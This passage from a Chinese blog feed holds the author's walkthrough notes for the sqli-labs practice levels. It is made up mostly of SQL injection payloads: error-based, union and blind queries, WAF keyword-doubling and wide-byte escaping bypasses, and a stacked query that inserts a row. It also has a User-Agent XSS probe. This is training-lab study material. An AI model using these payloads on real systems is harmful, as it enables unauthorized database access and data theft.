updatexml(1,concat(0x7e,(select database()),0x7e),1) -- SS </span></span><br></pre></td></tr></table></figure><p><code>XPATH syntax error: &#39;~security~&#39;</code><br>同样用字符包含</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; anandd updatexml(1,concat(0x7e,(select database()),0x7e),1) oorr &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p>成功</p><hr><h2 id="Less-25a"><a href="#Less-25a" class="headerlink" title="Less-25a"></a>Less-25a</h2><p>这里也是过滤and和or<br>这里单引号双引号都报错说明是数字型注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aandnd updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> database()),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="operator">%</span><span class="number">20</span><span class="comment">--%20</span></span><br></pre></td></tr></table></figure><p>没有回显，但单输入1可以有正确回显<br>说明这题不能使用报错注入，只能使用联合查询或者盲注</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> #  </span><br></pre></td></tr></table></figure><p>成功</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> ANANDD if(length(database())<span class="operator">=</span><span class="number">8</span>,sleep(<span class="number">5</span>),<span class="number">1</span>) #</span><br></pre></td></tr></table></figure><p>成功</p><hr><h2 id="Less-26"><a href="#Less-26" class="headerlink" title="Less-26"></a>Less-26</h2><p>这里的过滤非常严格，%0a这一类的绕过空格<br>且报错没关所以这里使用报错注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;||updatexml(1,concat(0,(database())),0)||&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p>成功</p><hr><h2 id="Less-26a"><a href="#Less-26a" class="headerlink" title="Less-26a"></a>Less-26a</h2><p>这里一样贴上上一关的payload</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;||updatexml(1,concat(0,(database())),0)||&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p>并没有报错，所以这里我们使用延时注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;%26%26if(length(database())=8,sleep(5),1)||&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p>成功</p><hr><h2 id="Less-27"><a href="#Less-27" class="headerlink" title="Less-27"></a>Less-27</h2><p>这里在上面的基础上又过滤掉了<code>union</code> <code>select</code><br>而且select用三次重写，union用两次重写<br>这里直接贴上报错注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;||updatexml(1,concat(0,(database())),0)||&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br><span class="line"><span class="string">&#x27;||updatexml(1,concat(0x7e,(seleselselectectct%0atable_name%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=&#x27;</span>security<span class="string">&#x27;%0alimit%0a0,1),0x7e),1)||&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p>成功</p><hr><h2 id="Less-27a"><a href="#Less-27a" class="headerlink" title="Less-27a"></a>Less-27a</h2><p>还是过滤<code>union</code> <code>select</code>，看看过滤程度<br>还是三次重写解决,union用两次重写<br>这里单引号不报错，双引号报错发现是双引号闭合且无报错提示<br>所以使用盲注</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;%26%26substring(database(),1,1)=&#x27;d&#x27;%26%26&quot;<span class="number">1</span>&quot;=&quot;<span class="number">1</span></span><br><span class="line"># 无回显</span><br><span class="line">&quot;%26%26substring(database(),1,1)=&#x27;s&#x27;%26%26&quot;<span class="number">1</span>&quot;=&quot;<span class="number">1</span></span><br><span class="line"># 回显正常</span><br></pre></td></tr></table></figure><p>成功</p><hr><h2 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h2><p>同样先探测闭合方式<br>确认是单引号闭合</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;)union select 1,2,3||(&#x27;</span><span class="number">1</span></span><br><span class="line"><span class="comment">--&gt; &#x27;)unionselect1,2,3||(&#x27;1</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>过滤空格使<span class="keyword">select</span>失效</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;)aunion%0aselect%0a1,2,3||(&#x27;</span><span class="number">1</span></span><br><span class="line"><span class="comment">--&gt; &#x27;)1,2,3||(&#x27;1</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>过滤<span class="keyword">union</span> <span class="keyword">select</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;)uunionnion%0aselselectect%0a1,2,3||(&#x27;</span><span class="number">1</span></span><br><span class="line"><span class="comment">--&gt;&#x27;)uunionnion selselectect 1,2,3||(&#x27;1</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>重写无效</span><br></pre></td></tr></table></figure><p>看来是检查select和union之间的有效连接</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">999</span><span class="string">&#x27;)union%0adistinct%0aselect%0a1,group_concat(table_name),3%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=database()%0a||(&#x27;</span><span class="number">1</span></span><br><span class="line"><span class="comment">--&gt; union distinct select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() ||(&#x27;1</span></span><br></pre></td></tr></table></figure><p>成功</p><hr><h2 id="Less-28a"><a href="#Less-28a" class="headerlink" title="Less-28a"></a>Less-28a</h2><p>和上题一样只不过少了一些过滤</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">99</span><span class="string">&#x27;)union distinct select 1,database(),3||(&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p>回显正常<br>成功</p><hr><h2 id="Less-29"><a href="#Less-29" class="headerlink" title="Less-29"></a>Less-29</h2><p>首先确定闭合方式为单引号闭合</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">99</span><span class="string">&#x27; union select 1,database(),3 and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p>成功</p><p>盲注</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>bool盲注</span><br><span class="line"><span class="string">&#x27; and length(database())=9 and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span> </span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>时间盲注</span><br><span class="line"><span class="string">&#x27; and if(length(database())=8,sleep(5),1) and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p>成功</p><p>报错注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1) or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br><span class="line"><span class="string">&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27; limit 0,1),0x7e),1) or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p>成功<br>这里好像要自己加载waf，这里就不做继续</p><hr><h2 id="Less-29a"><a href="#Less-29a" class="headerlink" title="Less-29a"></a>Less-29a</h2><p>双引号闭合<br>也是需要自己加载waf</p><hr><h2 id="Less-30"><a href="#Less-30" class="headerlink" title="Less-30"></a>Less-30</h2><p>单引号闭合<br>需要自己加载waf</p><hr><h2 id="Less-31"><a href="#Less-31" class="headerlink" title="Less-31"></a>Less-31</h2><p>“)闭合<br>需要自己加waf</p><hr><blockquote><p>以上waf关卡不知道是我的问题还是关卡问题需要自己加载waf<br>由于特地绕过一段时间，这里不做练习</p></blockquote><hr><h2 id="Less-32"><a href="#Less-32" class="headerlink" title="Less-32"></a>Less-32</h2><blockquote><p>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串</p></blockquote><p>这里我们使用宽字节注入，在前边添加%df,形成%df%27来过掉%5c</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">%</span>df<span class="operator">%</span><span class="number">27</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">user</span>(),<span class="number">3</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>成功<br>而后面的</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">%</span>df<span class="string">&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">--&gt; %df&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="number">0x27757365727327</span></span><br></pre></td></tr></table></figure><p>hex编码绕过</p><hr><h2 id="Less-33"><a href="#Less-33" class="headerlink" title="Less-33"></a>Less-33</h2><p>这里的文件和Less-32一样，不做练习</p><hr><h2 id="Less-34"><a href="#Less-34" class="headerlink" title="Less-34"></a>Less-34</h2><p>这是一个POST类型的宽字节注入<br>首先抓包扔burp</p><p>测试uname</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span>admin<span class="operator">%</span>df<span class="string">&#x27;&amp;passwd=1&amp;submit=Submit --&gt; 1&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><p>测试passwd</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span>admin<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">1</span><span class="operator">%</span>df<span class="string">&#x27;&amp;submit=Submit --&gt; &#x27;</span><span class="number">1</span>�\<span class="string">&#x27;&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>都存在注入<br>接着</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span>admin<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">1</span><span class="operator">%</span>df<span class="string">&#x27; union select 1,2 #&amp;submit=Submit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">uname=admin &amp;passwd=1%df&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> group_concat(column_name),<span class="number">2</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="number">0x27757365727327</span> #<span class="operator">&amp;</span>submit<span class="operator">=</span>Submit</span><br></pre></td></tr></table></figure><p>回显正常，成功</p><hr><h2 id="Less-35"><a href="#Less-35" class="headerlink" title="Less-35"></a>Less-35</h2><p>试了半天宽字节后发现tm直接能注<br>也不知道是不是我的bug</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database(),<span class="number">3</span> #</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="number">0x27757365727327</span> #</span><br></pre></td></tr></table></figure><p>回显成功</p><hr><h2 id="Less-36"><a href="#Less-36" class="headerlink" title="Less-36"></a>Less-36</h2><p>显注，盲注，报错注入，宽字节注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">%</span>df<span class="string">&#x27; union select 1,2,3 %23</span></span><br><span class="line"><span class="string">%df&#x27;</span> <span class="keyword">and</span> length(database())<span class="operator">=</span><span class="number">8</span> <span class="operator">%</span><span class="number">23</span></span><br><span class="line"><span class="operator">%</span>df <span class="keyword">and</span> if(length(database())<span class="operator">=</span><span class="number">8</span>,sleep(<span class="number">5</span>),<span class="number">1</span>) <span class="comment">--+</span></span><br><span class="line"><span class="operator">%</span>df<span class="string">&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+</span></span><br></pre></td></tr></table></figure><p>成功<br>这里不能直接用#来进行注释，用%23</p><p>这里mysql的real_escape_strings</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。</span><br><span class="line"></span><br><span class="line">下列字符受影响：</span><br><span class="line"></span><br><span class="line">\x00</span><br><span class="line">\n</span><br><span class="line">\r</span><br><span class="line">\</span><br><span class="line">&#39;</span><br><span class="line">&quot;</span><br><span class="line">\x1a</span><br><span class="line">如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。</span><br><span class="line"></span><br><span class="line">来自：w3school</span><br></pre></td></tr></table></figure><hr><h2 id="Less-37"><a href="#Less-37" class="headerlink" title="Less-37"></a>Less-37</h2><p>这题和上题一样是bypass mysql_real_escape_strings</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span><span class="number">1</span><span class="operator">%</span>df<span class="string">&#x27; union select 1,2 %23&amp;passwd=2&amp;submit=Submit</span></span><br></pre></td></tr></table></figure><p>宽字节绕过，成功</p><hr><h2 id="Less-38"><a href="#Less-38" class="headerlink" title="Less-38"></a>Less-38</h2><p>估计也是宽字节注入，只不过</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; and updatexml(1,(concat(0,(select database()),0x0)),1) and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p>回显成功</p><p><code>stacked query（堆叠查询）</code>的适用条件</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">MySQL<span class="operator">/</span>PHP <span class="operator">-</span> <span class="keyword">Not</span> supported (supported <span class="keyword">by</span> MySQL <span class="keyword">for</span> other API).</span><br><span class="line"></span><br><span class="line"><span class="keyword">SQL</span> Server<span class="operator">/</span><span class="keyword">Any</span> API <span class="operator">-</span> Supported.</span><br><span class="line"></span><br><span class="line">Oracle<span class="operator">/</span><span class="keyword">Any</span> API <span class="operator">-</span> <span class="keyword">Not</span> supported.</span><br></pre></td></tr></table></figure><p>很高的局限性哈</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1,database(),3;insert into users values(1,&#x27;</span>Sunr<span class="string">&#x27;,&#x27;</span>Sunr<span class="string">&#x27;)%23</span></span><br></pre></td></tr></table></figure><p>然后我们来看<br><img src="https://i.loli.net/2020/09/07/RBweZOCoJ5l9kxT.png" alt="image.png"><br>确定被插入</p><p>使用堆叠注入我们可以用分号分隔开sql语句，但回显的只有第一条，但是后面拼接的可以实现增删改，甚至可以写shell</p><p><a href="https://www.sqlinjection.net/stacked-queries/">相关资料</a></p><p>就到这里</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Sqli-lab-过关笔记-Less-23-Less-38&quot;&gt;&lt;a href=&quot;#Sqli-lab-过关笔记-Less-23-Less-38&quot; class=&quot;headerlink&quot; title=&quot;Sqli-lab 过关笔记 Less 23-Less 38&quot;&gt;&lt;/a&gt;Sqli-lab 过关笔记 Less 23-Less 38&lt;/h1&gt;</summary>
    
    
    
    <category term="学习笔记" scheme="http://0w0.host/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="笔记" scheme="http://0w0.host/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="渗透" scheme="http://0w0.host/tags/%E6%B8%97%E9%80%8F/"/>
    
    <category term="sqli-lab" scheme="http://0w0.host/tags/sqli-lab/"/>
    
  </entry>
  
  <entry>
    <title>sqli-lab Less 11-Less 22</title>
    <link href="http://0w0.host/2020/08/30/sqli-lab-Less-11-Less-22/"/>
    <id>http://0w0.host/2020/08/30/sqli-lab-Less-11-Less-22/</id>
    <published>2020-08-30T13:22:43.000Z</published>
    <updated>2020-09-10T14:09:05.974Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Sqli-lab-过关笔记-Less-11-Less-22"><a href="#Sqli-lab-过关笔记-Less-11-Less-22" class="headerlink" title="Sqli-lab 过关笔记 Less 11-Less 22"></a>Sqli-lab 过关笔记 Less 11-Less 22</h1><a id="more"></a><h2 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h2><p>首先测试语句闭合方式</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span>admin<span class="string">&#x27;&amp;passwd=11111&amp;submit=Submit</span></span><br></pre></td></tr></table></figure><p>得到报错信息提示</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">11111</span><span class="string">&#x27; LIMIT 0,1</span></span><br></pre></td></tr></table></figure><p>大致推断其sql查询语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> USERS <span class="keyword">WHERE</span> UNAME<span class="operator">=</span><span class="string">&#x27;uname&#x27;</span>,PASSWD<span class="operator">=</span><span class="string">&#x27;passwd&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><p>在PASSWD构造闭合，进行注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; UNION SELECT DATABASE(),USER() -- JDNJD </span></span><br></pre></td></tr></table></figure><p>成功，然后扔sqlmap</p><hr><h2 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h2><p>测试闭合方式</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span>admin\<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">11111</span><span class="operator">&amp;</span>submit<span class="operator">=</span>Submit</span><br></pre></td></tr></table></figure><p>报错信息</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">11111</span>&quot;) LIMIT 0,1</span><br></pre></td></tr></table></figure><p>构造闭合注入语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;) UNION SELECT DATABASE(),USER() -- sdk </span><br></pre></td></tr></table></figure><p>成功，扔sqlmap</p><hr><h2 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h2><p>测试闭合方式</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span>admin\<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">11111</span><span class="operator">&amp;</span>submit<span class="operator">=</span>Submit</span><br></pre></td></tr></table></figure><p>报错</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">11111</span><span class="string">&#x27;) LIMIT 0,1</span></span><br></pre></td></tr></table></figure><p>构造注入语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;) UNION SELECT USER(),DATABASE() -- JSDN </span></span><br></pre></td></tr></table></figure><p>界面不再回显信息<br>但是</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;../images/flag.jpg&quot;</span>   /&gt;</span></span><br></pre></td></tr></table></figure><p>所以进行盲注</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;) AND LENGTH(DATABASE())=8  -- JSDN </span></span><br></pre></td></tr></table></figure><p>返回是错误，检查原因，是因为passwd并不正确，所以使用</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;) OR LENGTH(DATABASE())=8  -- JSDN </span></span><br></pre></td></tr></table></figure><p>成功</p><hr><h2 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h2><p>测试闭合方式</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span>admin\<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">11111</span><span class="operator">&amp;</span>submit<span class="operator">=</span>Submit</span><br></pre></td></tr></table></figure><p>报错</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">11111</span>&quot; LIMIT 0,1</span><br></pre></td></tr></table></figure><p>构造注入语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1111</span>&quot; OR LENGTH(DATABASE())=8 -- SJSN </span><br></pre></td></tr></table></figure><p>返回flag.jpg，成功</p><hr><h2 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h2><p>测试闭合方式</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span>admin\<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">11111</span><span class="operator">&amp;</span>submit<span class="operator">=</span>Submit</span><br></pre></td></tr></table></figure><p>这里不再提示错误的语句只返回slap.jpg</p><p>开始手工fuzzing闭合方式</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; OR 1=1 -- sjjs </span></span><br></pre></td></tr></table></figure><p>返回flag.jpg<br>开始构造注入语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; OR LENGTH(DATABASE())=8 -- sjjs </span></span><br></pre></td></tr></table></figure><p>返回flag.jpg，成功</p><hr><h2 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h2><p>同样开始fuzzing测试闭合方式</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;) OR 1=1 -- DDD </span><br></pre></td></tr></table></figure><p>返回flag.jpg</p><p>开始构造注入语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;) OR LENGTH(DATABASE())=8 -- DDD </span><br></pre></td></tr></table></figure><p>返回flag.jpg，成功</p><hr><h2 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h2><p>这里可以看到是密码更新的一关<br>首先输入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span>admin<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">11111</span><span class="operator">&amp;</span>submit<span class="operator">=</span>Submit</span><br></pre></td></tr></table></figure><p>返回flag1.jpg是密码更新成功</p><p>输入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span>admin<span class="string">&#x27; &amp;passwd=11111&amp;submit=Submit</span></span><br></pre></td></tr></table></figure><p>返回slap1.jpg提示<code>BUG OFF YOU SILLY DUMB HACKER</code><br>输入    </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span>admin<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">11111</span><span class="string">&#x27; &amp;submit=Submit</span></span><br></pre></td></tr></table></figure><p>返回报错<code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;admin&#39;&#39; at line 1</code></p><p>看来是passwd字段存在注入，<br>开始构造报错注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; OR UPATDEXML(1,CONCAT(0X74,(SELECT DATABASE()),0X74),1) -- DJD</span></span><br></pre></td></tr></table></figure><p>爆出错误</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FUNCTION</span> security.UPATDEXML does <span class="keyword">not</span> exist</span><br></pre></td></tr></table></figure><p>爆出数据库名，成功</p><hr><h2 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h2><p>首先输入错误的密码，页面依旧显示ip，输入正确的密码后页面显示User Agent<br>发现直接显示user agent尝试xss</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0 <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">(alert(<span class="regexp">/1/</span>))</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>弹出页面成功<br>开始测试用户名密码的注入，fuzzing后无结果，既然页面要返回user agent，必定要做处理</p><p>测试user agent字段的闭合方式测试出是单引号</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">User</span><span class="operator">-</span>Agent: Mozilla<span class="operator">/</span><span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">80.0</span>) Gecko<span class="operator">/</span><span class="number">20100101</span> Firefox<span class="operator">/</span><span class="number">80.0</span> <span class="string">&#x27; OR SLEEP(5) -- SHDH </span></span><br></pre></td></tr></table></figure><p>页面依旧正常并没有延时，查阅资料后发现等如下闭合单引号</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">User</span><span class="operator">-</span>Agent: Mozilla<span class="operator">/</span><span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">80.0</span>) Gecko<span class="operator">/</span><span class="number">20100101</span> Firefox<span class="operator">/</span><span class="number">80.0</span> <span class="string">&#x27; OR 